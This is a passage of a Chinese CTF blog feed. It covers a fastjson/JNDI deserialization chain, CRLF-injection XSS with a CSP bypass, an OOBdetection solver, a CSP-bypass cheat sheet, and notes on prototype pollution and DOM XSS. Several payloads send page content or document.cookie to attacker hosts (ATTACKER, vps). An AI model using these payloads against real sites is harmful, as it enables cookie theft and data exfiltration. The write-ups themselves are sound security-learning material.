class="literal">null</span>);</span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;conn&quot;</span>,c);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果用fastjson 1.2.60版本跑这个payload就会报<br>RMIConnector没有无参构造函数这个错误，搞得我想找平替RMIConnector的类，要满足以下三点</p>
<ul>
<li>有connect()函数</li>
<li>实现了JMXConnector接口</li>
<li>有无参构造的函数</li>
</ul>
<p>结果找了半天没找到<br>调用链如下，可以自己调试一下<br><code>BadAttributeValueExpException.readObject.toString -&gt; FastJSON -&gt; MyBean.getConnect -&gt; RMIConnector.connect -&gt; JNDI</code></p>
<h2 id="obsidian"><a href="#obsidian" class="headerlink" title="obsidian"></a>obsidian</h2><p>做题的时候一直以为是这个软件的rce，然后在那边绕过询问弹框，用<br><a href="https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743">https://forum.obsidian.md/t/possible-remote-code-execution-through-obsidian-uri-scheme/39743</a><br>这个poc去打rce，打的时候还一直在思考如果是这样搞的话，那为什么还需要xss➕绕过csp，结果最后还真的不是😂<br>当时还脑抽着想为什么他访问我的云服务器没有cookie</p>
<p>接下来开始分析，破解suffix就不说了</p>
<h3 id="crlf绕过csp加注入xss"><a href="#crlf绕过csp加注入xss" class="headerlink" title="crlf绕过csp加注入xss"></a>crlf绕过csp加注入xss</h3><p><img src="/2023/04/26/aliyunctf-web/1.png" alt><br>那么直接在nodeid后面加crlf注入，加xss就可以绕过csp，并且获得setcookie<br><code>http://比赛ip/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%0d%0a%0d%0a</code><br>上面的链接就可以进行弹窗，而且页面会显示<br><img src="/2023/04/26/aliyunctf-web/2.png" alt><br>就是因为crlf把他本来的http响应弄成response text了<br>那么接下来就很明了了<br><code>http://比赛/note/123123%0d%0aA:B%0d%0a%0d%0a%3Cscript%3Efetch(&#39;%2Fblog&#39;).then((response)%20%3D%3E%20response.text()).then((data)%20%3D%3Ebtoa(data)).then((data)%20%3D%3Elocation.replace(%60http%3A%2F%2F</code>+ip+<code>%3A99%2F%3Fdata%3D%24%7Bdata%7D%60))%3C%2Fscript%3E%0d%0a%0d%0a</code><br>通过js注入<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/blog&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure></p>
<h2 id="OOBdetection"><a href="#OOBdetection" class="headerlink" title="OOBdetection"></a>OOBdetection</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 设置目标服务器的IP地址和端口</span></span><br><span class="line">ip_address = <span class="string">&quot;47.98.209.191&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的套接字（socket）</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标服务器</span></span><br><span class="line">s.connect((ip_address, port))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">resp = data.decode()</span><br><span class="line">matchs1 = re.match(<span class="string">r&quot;sha256\(XXX(.*?)\)&quot;</span>, resp)</span><br><span class="line">code1 = matchs1.group(<span class="number">1</span>).split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">code2 = resp.split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code1 : &quot;</span> + code1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code2 : &quot;</span> + code2)</span><br><span class="line"><span class="comment"># 服务器提供的信息</span></span><br><span class="line">target_hash = code2</span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(code1)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonNegativeIndexList</span>(<span class="title class_ inherited__">list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__setitem__(index, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_to_python_syntax</span>(<span class="params">c_code</span>):</span><br><span class="line">    array_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[([\sa-zA-Z0-9_+]*)\](?:\s*\[([\sa-zA-Z0-9_+]*)\])?;&quot;</span></span><br><span class="line">    assignment_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([0-9]+);&quot;</span></span><br><span class="line"></span><br><span class="line">    array_match = re.match(array_pattern, c_code)</span><br><span class="line">    assignment_match = re.match(assignment_pattern, c_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> array_match:</span><br><span class="line">        var_name = array_match.group(<span class="number">1</span>)</span><br><span class="line">        first_dim = array_match.group(<span class="number">2</span>)</span><br><span class="line">        second_dim = array_match.group(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> second_dim:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([[None]*(<span class="subst">&#123;second_dim&#125;</span>)]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([None]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> assignment_match:</span><br><span class="line">        var_name = assignment_match.group(<span class="number">1</span>)</span><br><span class="line">        value = assignment_match.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid C code provided&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code_lines = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> code_line <span class="keyword">in</span> code_lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(code_line.find(<span class="string">&quot;int&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(code_line.find(<span class="string">&quot;[&quot;</span>)!= -<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(c_to_python_syntax(code_line))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span>(code_line.find(<span class="string">&#x27;=&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;=None&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">exec</span>(code_line) <span class="comment">#TypeError(未初始化)   IndexError（越界）   </span></span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span>(e.args[<span class="number">0</span>].find(<span class="string">&#x27;list indices must be integers or slices&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;boo&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ifboo</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code = patch(<span class="built_in">input</span>) <span class="comment">#补全代码</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prfint</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    input_lists = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> input_list <span class="keyword">in</span> input_lists:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(input_list[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                new_code += input_list+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的 XXX 值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="comment"># 将 i 转换成 16 进制字符串，左侧填充 0 到 6 位</span></span><br><span class="line">    xxx_hex = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    input_str = <span class="built_in">bytes</span>.fromhex(xxx_hex) + salt</span><br><span class="line">    hash_obj = hashlib.sha256(input_str)</span><br><span class="line">    hash_hex = hash_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果哈希值匹配，则打印 XXX 值并退出循环</span></span><br><span class="line">    <span class="keyword">if</span> hash_hex == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found XXX: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(xxx_hex))</span><br><span class="line">        code = xxx_hex</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.sendall(code.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收来自服务器的数据（设定接收数据的最大字节数为1024）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;TIMETIMETIME:::::&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">input</span> = data.decode() <span class="comment">#Your answer (safeb/unknown):</span></span><br><span class="line">        input_code = prfint(<span class="built_in">input</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        </span><br><span class="line">        boo = ifboo(input_code.replace(<span class="string">&#x27;[ &#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27; ]&#x27;</span>,<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span>(boo==<span class="string">&#x27;boo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;noboo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;safe&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;safe\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;unknown&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;unknown\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        <span class="comment"># 发送用户输入的数据到服务器</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>网上都是转成lark语法，我是转成了python语法，然后重载了列表，让他如果index&lt;0了，就触发异常，满足c语言的语法，然后根据不同的异常信息去判断结果</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>misc</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>csp 策略及绕过</title>
    <url>/2023/07/20/csp-%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="部分csp绕过方法"><a href="#部分csp绕过方法" class="headerlink" title="部分csp绕过方法"></a>部分csp绕过方法</h2><span id="more"></span>
<h3 id="unsafe-eval-？"><a href="#unsafe-eval-？" class="headerlink" title="unsafe-eval ？"></a>unsafe-eval ？</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;unsafe-eval&#x27; data: </span><br></pre></td></tr></table></figure><br>绕过代码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="CDN加载旧版js"><a href="#CDN加载旧版js" class="headerlink" title="CDN加载旧版js"></a>CDN加载旧版js</h3><p>csp策略<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src: https://cdnjs.cloudflare.com ;</span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span> &#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1);//&#x27;);&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h3 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h3><p>将csp策略挤到返回包的body中,记得注意content-length</p>
<h3 id="不完整script标签绕过"><a href="#不完整script标签绕过" class="headerlink" title="不完整script标签绕过"></a>不完整script标签绕过</h3><p>当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性</p>
<p>csp<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection:0&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-xxxxx&#x27;&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">&#x27;xxxxx&#x27;</span>&gt;<span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><br>exp<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="attr">data</span>:text/plain,<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="iframe禁止js"><a href="#iframe禁止js" class="headerlink" title="iframe禁止js"></a>iframe禁止js</h3><ul>
<li>iframe标签可以设置csp，可以禁止掉某些前端过滤的js</li>
<li>如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP</li>
</ul>
<h3 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h3><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;public&quot;</span>&gt;</span><br></pre></td></tr></table></figure><br>meta可以设置Cookie（Firefox下），可以结合self-xss利用。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Set-Cookie&quot;</span> <span class="title class_">Content</span>=<span class="string">&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>还有更多可以参考下面的链接</p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval</a></li>
<li><a href="https://www.jianshu.com/p/f1de775bc43e">https://www.jianshu.com/p/f1de775bc43e</a></li>
<li><a href="https://cloud.tencent.com/developer/chapter/13541">https://cloud.tencent.com/developer/chapter/13541</a></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>前端</tag>
        <tag>js</tag>
        <tag>csp</tag>
      </tags>
  </entry>
  <entry>
    <title>前端ctf(持续更新)</title>
    <url>/2023/09/06/%E5%89%8D%E7%AB%AFctf/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp<br><span id="more"></span></p>
<h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.js中有一段代码<br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>其中innerText会html解码，而innerHTML会把赋值的内容原封不动的输出到页面中，所以如果输入的是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>解码完以后就是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>再把解码的内容赋值给innerHTML，那么就会造成dom xss<br>修复这个漏洞的话可以把innerHTML改成innerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>当innerText是被赋值的时候，输出到页面的时候会把html编码在输出</p>
<h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>这是官方writeup，只对其中一些点进行记录</p>
<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当时看到Object.assign联想到了原型链污染，但是我是用类似下面的方式去尝试原型链污染的，显然是失败了<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>但是如果是下面这种就是可以成功污染的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
<h3 id="污染的点-editor"><a href="#污染的点-editor" class="headerlink" title="污染的点 editor"></a>污染的点 editor</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当uri开头不是view的时候就会加载这个loadEditorResources函数<br>而这个函数中<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>这一段会设置一个js加载进去，<em>并且会设置好nonce</em>，其中editor在bootstrap.js中被定义了，所以只需要原型链覆盖了这个editor就可以了</p>
<h3 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h3><p>因为有csp策略，无法进行直接加载js，原型链污染不能直接覆盖被赋值的变量，所以利用iframe，设置csp，允许恶意的js加载，并且禁止加载bootstrap，就可以成功绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>在这里我想到如果没有nonce，他只是script-src <a href="http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行">http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行</a></p>
</blockquote>
